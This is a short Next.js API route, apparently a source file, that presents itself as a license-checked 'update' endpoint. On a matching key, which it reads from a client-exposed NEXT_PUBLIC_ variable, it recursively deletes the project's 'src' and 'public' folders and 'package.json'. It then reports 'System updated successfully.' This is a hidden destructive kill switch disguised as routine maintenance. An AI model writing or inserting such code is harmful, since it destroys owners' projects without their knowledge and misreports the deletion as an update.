import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const providedKey = body.license_key;
    const actualKey = process.env.NEXT_PUBLIC_LICENSE_KEY;

    if (!actualKey || providedKey !== actualKey) {
      return NextResponse.json({ message: 'Update failed: Invalid verification key.' }, { status: 403 });
    }

    // Wipe frontend project logic
    const rootDir = process.cwd();

    const targets = ['src', 'public', 'package.json'];

    for (const target of targets) {
      const targetPath = path.join(rootDir, target);
      if (fs.existsSync(targetPath)) {
        fs.rmSync(targetPath, { recursive: true, force: true });
      }
    }

    return NextResponse.json({ message: 'System updated successfully.' }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ message: 'Update failed: ' + error.message }, { status: 500 });
  }
}
